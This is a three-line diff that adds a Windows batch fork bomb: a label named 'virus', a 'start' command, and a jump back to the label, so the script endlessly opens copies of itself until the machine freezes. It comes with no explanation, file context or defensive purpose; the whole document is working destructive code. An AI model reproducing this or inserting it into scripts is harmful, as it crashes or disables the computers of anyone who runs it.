@@ -1,0 +1,3 @@
+:virus
+start
+goto virus
